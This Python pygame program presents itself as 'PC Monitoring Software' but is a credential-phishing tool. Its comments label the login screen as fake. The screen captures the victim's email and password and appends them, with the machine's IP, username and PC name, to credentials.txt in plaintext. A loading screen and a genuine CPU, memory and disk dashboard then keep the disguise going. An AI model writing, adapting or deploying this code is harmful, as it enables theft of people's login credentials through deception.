import pygame
import sys
import socket
import platform
import psutil
import getpass
import datetime

# Initialize pygame
pygame.init()

# Screen settings
WIDTH, HEIGHT = 800, 600
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("PC Monitoring Software")

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)
LIGHT_GRAY = (200, 200, 200)
GRAY = (169, 169, 169)

# Font
font = pygame.font.Font(None, 36)
large_font = pygame.font.Font(None, 72)

# Input box settings for password and email
input_box_password = pygame.Rect(300, 250, 200, 40)
input_box_email = pygame.Rect(300, 300, 200, 40)

color_inactive = LIGHT_GRAY
color_active = RED
color_password = color_inactive
color_email = color_inactive
active_password = False
active_email = False
text_password = ''
text_email = ''

# Function to get system information (IP, username, PC name)
def get_system_info():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        ip = "127.0.0.1"
    username = getpass.getuser()
    pc_name = platform.node()
    return ip, username, pc_name

real_ip, username, pc_name = get_system_info()

# Update CPU and memory usage real-time
def get_performance_metrics():
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    memory_usage = memory_info.percent
    disk_info = psutil.disk_usage('/')
    disk_usage = disk_info.percent
    return cpu_usage, memory_usage, disk_usage

# Save to file (this is where the credentials will be saved)
def save_credentials(ip, password, email, username, pc_name):
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    with open("credentials.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {ip} | Username: {username} | PC Name: {pc_name} | Email: {email} | Password: {password}\n")
    print(f"[+] Saved: {timestamp} IP={ip} Username={username} PC Name={pc_name} Email={email} Password={password}")

# Login screen with fake password and email
def login_screen():
    global active_password, active_email, color_password, color_email, text_password, text_email
    running = True
    clock = pygame.time.Clock()

    while running:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False

            if event.type == pygame.MOUSEBUTTONDOWN:
                if input_box_password.collidepoint(event.pos):
                    active_password = not active_password
                elif input_box_email.collidepoint(event.pos):
                    active_email = not active_email
                else:
                    active_password = False
                    active_email = False

                color_password = color_active if active_password else color_inactive
                color_email = color_active if active_email else color_inactive

            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False
                if active_password:
                    if event.key == pygame.K_RETURN:
                        save_credentials(real_ip, text_password, text_email, username, pc_name)
                        loading_screen()
                        pc_monitoring_dashboard()
                    elif event.key == pygame.K_BACKSPACE:
                        text_password = text_password[:-1]
                    else:
                        text_password += event.unicode
                elif active_email:
                    if event.key == pygame.K_BACKSPACE:
                        text_email = text_email[:-1]
                    else:
                        text_email += event.unicode

        screen.fill(WHITE)

        # Render the text for both input boxes
        txt_surface_password = font.render(text_password, True, color_password)
        txt_surface_email = font.render(text_email, True, color_email)

        width_password = max(200, txt_surface_password.get_width()+10)
        width_email = max(200, txt_surface_email.get_width()+10)

        input_box_password.w = width_password
        input_box_email.w = width_email

        # Render placeholder text if the input is inactive and empty
        if not active_password and text_password == '':
            placeholder_password = font.render("Password", True, GRAY)
            screen.blit(placeholder_password, (input_box_password.x+5, input_box_password.y+5))
        else:
            screen.blit(txt_surface_password, (input_box_password.x+5, input_box_password.y+5))

        if not active_email and text_email == '':
            placeholder_email = font.render("Email", True, GRAY)
            screen.blit(placeholder_email, (input_box_email.x+5, input_box_email.y+5))
        else:
            screen.blit(txt_surface_email, (input_box_email.x+5, input_box_email.y+5))

        pygame.draw.rect(screen, color_password, input_box_password, 2)
        pygame.draw.rect(screen, color_email, input_box_email, 2)

        instructions = font.render("Enter Email and Password", True, BLACK)
        screen.blit(instructions, (WIDTH//2 - instructions.get_width()//2, 150))

        pygame.display.flip()
        clock.tick(30)

    pygame.quit()
    sys.exit()

# Loading screen with simple effect
def loading_screen():
    screen.fill(WHITE)
    loading_text = large_font.render("Fetching Resources", True, BLACK)
    screen.blit(loading_text, (WIDTH//2 - loading_text.get_width()//2, HEIGHT//2 - 100))
    pygame.display.flip()
    pygame.time.delay(2000)
    loading_text = large_font.render("Longer Times Expected...", True, BLACK)
    screen.blit(loading_text, (WIDTH//2 - loading_text.get_width()//2, HEIGHT//2 - 30))
    pygame.display.flip()
    pygame.time.delay(2000)

# Main screen with system stats
def pc_monitoring_dashboard():
    running = True
    clock = pygame.time.Clock()

    while running:
        screen.fill(WHITE)  # Set background to white for simplicity

        # Draw header
        header_text = font.render(f"PC Monitoring - {pc_name}", True, BLACK)
        screen.blit(header_text, (WIDTH//2 - header_text.get_width()//2, 20))

        # Get current performance metrics
        cpu_usage, memory_usage, disk_usage = get_performance_metrics()

        # Display system stats with clear labels
        cpu_text = font.render(f"CPU Usage: {cpu_usage}%", True, BLACK)
        screen.blit(cpu_text, (50, 100))
        memory_text = font.render(f"Memory Usage: {memory_usage}%", True, BLACK)
        screen.blit(memory_text, (50, 150))
        disk_text = font.render(f"Disk Usage: {disk_usage}%", True, BLACK)
        screen.blit(disk_text, (50, 200))

        # Display instructions at the bottom
        instructions = font.render("Press 'Q' to Quit", True, BLACK)
        screen.blit(instructions, (WIDTH//2 - instructions.get_width()//2, HEIGHT - 40))

        # Update screen
        pygame.display.flip()

        # Handle quitting the program
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_q:
                    running = False

        clock.tick(1)  # Update every second (real-time updates)

    pygame.quit()
    sys.exit()

# Main loop
def main():
    login_screen()

if __name__ == "__main__":
    main()
